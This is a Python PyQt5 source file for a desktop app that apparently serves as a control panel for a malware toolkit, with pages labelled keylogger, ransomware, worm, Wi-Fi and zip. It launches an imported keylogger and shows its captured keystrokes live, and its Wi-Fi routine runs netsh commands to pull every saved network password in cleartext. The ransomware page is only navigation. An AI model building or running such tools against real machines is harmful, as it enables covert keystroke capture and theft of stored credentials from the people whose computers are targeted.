import time

from PyQt5 import uic
from PyQt5.QtCore import QObject, QThread, pyqtSignal
from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton, QFrame, QWidget, QStackedWidget, QTextEdit, QLabel
import sys

import os
from threading import Thread, Timer
import subprocess
import re

from malwares.keylogger.keylogger import start_keylogger


# to open designer
# qt5-tools designer


class Worker(QObject):
    finished = pyqtSignal()
    progress = pyqtSignal(str)

    def read_log(self):
        with open('log.txt', 'r') as f:
            f.seek(0, 2)
            start_time = time.time()
            while True:
                line = f.readline()
                if time.time() - start_time >= 10:
                    break
                if not line:
                    time.sleep(0.1)
                    continue
                self.progress.emit(line)
        print("END thread")
        self.finished.emit()


class App(QMainWindow):
    def __init__(self):
        super(App, self).__init__()
        uic.loadUi("ui/app_ui.ui", self)
        self.setWindowTitle("app")

        self.desktop = os.path.expanduser('~') + "\\Desktop"

        # pages
        self.stack = self.findChild(QStackedWidget, "stackedWidget")

        # menu buttons
        self.home = self.findChild(QPushButton, "home_button").clicked.connect(
            lambda: self.stack.setCurrentWidget(self.findChild(QWidget, "page_1")))
        self.keylogger = self.findChild(QPushButton, "keylogger_button").clicked.connect(
            lambda: self.stack.setCurrentWidget(self.findChild(QWidget, "page_2")))
        self.ransomware = self.findChild(QPushButton, "ransomware_button").clicked.connect(
            lambda: self.stack.setCurrentWidget(self.findChild(QWidget, "page_3")))
        self.worm = self.findChild(QPushButton, "worm_button").clicked.connect(
            lambda: self.stack.setCurrentWidget(self.findChild(QWidget, "page_4")))
        self.wifi = self.findChild(QPushButton, "wifi_button").clicked.connect(
            lambda: self.stack.setCurrentWidget(self.findChild(QWidget, "page_5")))
        self.zip = self.findChild(QPushButton, "zip_button").clicked.connect(
            lambda: self.stack.setCurrentWidget(self.findChild(QWidget, "page_6")))

        # keylogger
        self.keylogger_start = self.findChild(QPushButton, "start_keylogger")
        self.keylogger_start.clicked.connect(self.keylogger_run)
        self.keylogger_output = self.findChild(QTextEdit, "output_k")
        self.k_keylogger_thread = Thread(target=start_keylogger)
        self.k_log_thread = None
        self.k_text = ''

        self.k_log_thread = QThread()
        self.k_worker = Worker()
        self.k_worker.moveToThread(self.k_log_thread)

        # ransomware
        self.r_stack = self.findChild(QStackedWidget, "ransom_stack")
        self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_1"))  # set to first page
        self.r_1 = self.findChild(QPushButton, "ransom_bt__1").clicked.connect(self.ransom_start)
        self.r_2 = self.findChild(QPushButton, "ransom_bt__2").clicked.connect(self.ransom_keys)
        self.r_3 = self.findChild(QPushButton, "ransom_bt__3").clicked.connect(self.ransom_send)
        self.r_4 = self.findChild(QPushButton, "ransom_bt__4").clicked.connect(self.ransom_run)
        self.r_5 = self.findChild(QPushButton, "ransom_bt__5").clicked.connect(self.ransom_decrypt)
        self.r_6 = self.findChild(QPushButton, "ransom_bt__6").clicked.connect(self.ransom_return)

        # wifi
        self.wifi_button = self.findChild(QPushButton, "wifi_button_start")
        self.wifi_button.clicked.connect(self.wifi_password_start)
        self.wifi_output = self.findChild(QTextEdit, "wifi_output")
        self.wifi_text = ''
        # zip
        self.zip_path_label = self.findChild(QLabel, "file_label")
        self.zip_find_file = self.findChild(QPushButton, "find_file")
        self.zip_start = self.findChild(QPushButton, "zip_start")

        self.show()

        self.stack.setCurrentWidget(self.findChild(QWidget, "page_1"))

    def keylogger_run(self):
        self.k_keylogger_thread.start()

        self.k_log_thread.started.connect(self.k_worker.read_log)
        self.k_worker.finished.connect(self.k_log_thread.quit)
        self.k_worker.finished.connect(self.k_worker.deleteLater)
        self.k_log_thread.finished.connect(self.k_log_thread.deleteLater)
        self.k_worker.progress.connect(self.k_report_progress)

        self.k_log_thread.start()

        self.keylogger_start.setEnabled(False)
        self.keylogger_output.setEnabled(False)
        self.k_log_thread.finished.connect(self.k_reset)

    def k_reset(self):
        self.keylogger_start.setEnabled(True)
        self.keylogger_output.setEnabled(True)
        self.k_text = ''

    def k_report_progress(self, text):
        self.k_text += text
        self.keylogger_output.setText(f'{self.k_text}')

    def ransom_start(self):
        self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_2"))

    def ransom_keys(self):
        self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_3"))

    def ransom_send(self):
        self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_4"))

    def ransom_run(self):
        self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_5"))

    def ransom_decrypt(self):
        self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_6"))

    def ransom_return(self):
        self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_1"))

    def wifi_password_start(self):

        self.wifi_text = ''
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

        wifi_list = []

        if len(profile_names) != 0:
            for name in profile_names:

                wifi_profile = {}

                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()

                if re.search("Security key           : Absent", profile_info):
                    continue
                else:

                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                                       capture_output=True).stdout.decode()
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
                    if password is None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile)

        for x in range(len(wifi_list)):
            self.wifi_text += str(wifi_list[x]) + '\n'
            print("start")
        self.wifi_output.setText(self.wifi_text)


app = QApplication(sys.argv)
win = App()
win.show()
sys.exit(app.exec_())
